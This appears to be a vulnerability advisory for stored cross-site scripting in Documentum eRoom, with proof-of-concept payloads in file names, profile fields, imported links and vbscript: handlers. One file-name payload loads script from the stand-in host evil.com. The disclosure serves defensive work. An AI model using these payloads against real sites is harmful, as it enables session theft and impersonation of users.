Vulnerability overview/description:
-----------------------------------
Documentum eRoom suffers from multiple permanent cross-site scripting 
vulnerabilities, which allow an attacker to steal other user's sessions, 
to impersonate other users and to gain unauthorized access to documents 
hosted in eRooms. A JavaScript worm could be utilized to crawl an eRoom and 
gather all available documents.

There are many parameters which are not properly sanitized and thus
vulnerable to XSS.


Proof of concept:
-----------------
1) Permanent Cross-Site Scripting within file names
The extension of files uploaded to Documentum eRoom are not sanitized. The 
following file name would lead to execution of script code as soon as the 
file is viewed (i.e. in the search results or the directory view)

file."><script>alert(1)</script>
."><script src="http://evil&#x26;#x2e;com/evil%2ejs"></script>
."><script src="/eRoomReq/Files/facility/eRoom/0_f000/test%2etxt"></script>

2) Permanent Cross-Site Scripting within the personal information
Users can change their personal information. By editing the field 
"organization" it is possible to store a malicious JavaScript payload 
(e.g., <script>alert(1)</script>).
The payload gets executed every time a user visits a part of the website 
responsible for alerting users about changes in the eRoom (i.e., "Choose 
Members" for eRooms).

3) Cross-Site Scripting within Links
Via the import function it is possible to add formatted text to database 
fields even when the eRoom Plugin is not utilized.
The following formatted text will create links that execute JavaScript code 
once clicked:

"<div class=""user""><a
href=""&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)"">test</a></div>"
"<div class=""user""><a onclick=""alert(1)"">test</a></div>"

4) Unhandled protocol handlers in links
Although it is not possible to create links with the function "create link" 
that execute JavaScript code via the protocol handler "javascript:", the 
protocol handler "vbscript" is allowed and would execute VBScript, for example 
in IE (e.g., "vbscript:alert(1)", "callto:+1900[premium-rate number]", etc.).
